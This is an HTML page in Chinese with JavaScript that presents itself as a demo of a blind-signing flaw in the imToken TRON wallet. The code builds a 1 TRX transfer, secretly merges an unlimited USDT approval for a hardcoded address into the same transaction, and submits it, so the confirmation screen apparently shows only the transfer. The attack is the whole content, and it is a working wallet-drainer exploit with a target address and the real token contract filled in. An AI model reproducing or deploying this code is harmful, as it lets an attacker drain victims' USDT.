<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>所﷼非所签 - TRX 转账隐藏 USDT 授权</title>
    <style>
        body { font-family: Arial, sans-serif; padding: 20px; background: #1a1a2e; color: #fff; }
        button { padding: 12px 24px; font-size: 18px; margin: 10px; background: #e94560; border: none; color: #fff; border-radius: 8px; cursor: pointer; }
        pre { background: #16213e; padding: 15px; border-radius: 6px; white-space: pre-wrap; word-break: break-all; }
        .warning { color: #ff7b7b; font-weight: bold; }
    </style>
</head>
<body>
    <h1>🔓 所﷼非所签演示（imToken TRON）</h1>
    <p>本页面将向你展示：<br>
    👉 <b>钱包确认页显示：向 <span id="displayTo"></span> 转账 <strong>1 TRX</strong></b> <br>
    👉 <b>实际签名交易包含：USDT 无限额度授权给同一地址</b></p>

    <div>
        <p>当前钱包地址：<span id="walletAddr" style="color:#0ff;">未连接</span></p>
        <p>目标地址（收款 & 授权人）：<span id="targetAddr">TEfFnhxxeRbghthqJ4dSbAK4mqAtkJbSAz</span></p>
    </div>

    <button id="connectBtn">🔗 连接钱包</button>
    <button id="attackBtn" disabled>💣 发起所﷼非所签交易</button>

    <div id="log" style="margin-top: 20px;"></div>

  <script>
    const TARGET_ADDRESS = 'TEfFnhxxeRbghthqJ4dSbAK4mqAtkJbSAz';
    const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
    const TRX_AMOUNT_SUN = 1000000;          // 1 TRX
    const UINT256_MAX = '115792089237316195423570985008687907853269984665640564039457584007913129639935';

    let userAddress = null;
    let tronWeb = null;

    function log(msg) {
        document.getElementById('log').innerHTML += '<pre>' + msg + '</pre>';
    }

    // 连接钱包
    document.getElementById('connectBtn').addEventListener('click', async () => {
        try {
            if (!window.tronWeb || !window.imToken) {
                log('❌ 未检测到 imToken 环境，请在 imToken DApp 浏览器中打开');
                return;
            }
            tronWeb = window.tronWeb;
            const addr = tronWeb.defaultAddress.base58;
            if (addr) {
                userAddress = addr;
                document.getElementById('walletAddr').innerText = userAddress;
                document.getElementById('attackBtn').disabled = false;
                log('✅ 已连接：' + userAddress);
            } else {
                // 备用
                const account = await window.imToken.callPromisifyAPI('account.getWalletAddress', []);
                userAddress = account.address;
                tronWeb.setAddress(userAddress);
                document.getElementById('walletAddr').innerText = userAddress;
                document.getElementById('attackBtn').disabled = false;
                log('✅ 已连接：' + userAddress);
            }
        } catch (err) {
            log('❌ 连接失败：' + err.message);
        }
    });

    // 攻击
    document.getElementById('attackBtn').addEventListener('click', async () => {
        if (!userAddress) return alert('请先连接钱包');
        try {
            log('🛠️ 构造双重交易...');

            // 1. 普通转账交易
            const tx1 = await tronWeb.transactionBuilder.sendTrx(
                TARGET_ADDRESS,
                TRX_AMOUNT_SUN,
                userAddress
            );
            log('➡️ TransferContract 已生成');

            // 2. USDT approve 调用
            const tx2Response = await tronWeb.transactionBuilder.triggerSmartContract(
                USDT_CONTRACT,
                'approve(address,uint256)',
                { feeLimit: tronWeb.toSun(20) },
                [
                    { type: 'address', value: TARGET_ADDRESS },
                    { type: 'uint256', value: UINT256_MAX }
                ],
                userAddress
            );
            const tx2 = tx2Response.transaction;  // 关键修复点
            log('🔐 TriggerSmartContract 已生成');

            // 校验
            if (!tx1?.raw_data?.contract || !tx2?.raw_data?.contract) {
                throw new Error('交易对象缺少 raw_data.contract');
            }

            // 合并合约调用
            const combinedContract = [
                ...tx1.raw_data.contract,
                ...tx2.raw_data.contract
            ];

            // 克隆转账交易作为最终交易
            const finalTx = JSON.parse(JSON.stringify(tx1));
            finalTx.raw_data.contract = combinedContract;
            finalTx.raw_data.fee_limit = tronWeb.toSun(20); // 手续费
            delete finalTx.txID;

            log('📦 合约数：' + finalTx.raw_data.contract.length);
            log('📡 调用 imToken.callPromisifyAPI(\'tron.sendTransaction\') …');

            // 提交
            const result = await window.imToken.callPromisifyAPI('tron.sendTransaction', finalTx);
            log('✅ 交易已提交：' + JSON.stringify(result));
            log('⚠️ 请在钱包确认页查看是否仅显示 TRX 转账');
        } catch (err) {
            log('❌ 错误：' + err.message);
            console.error(err);
            log('💡 如仍出错，请打开控制台查看 tronWeb 版本结构');
        }
    });
</script>
</body>
</html>
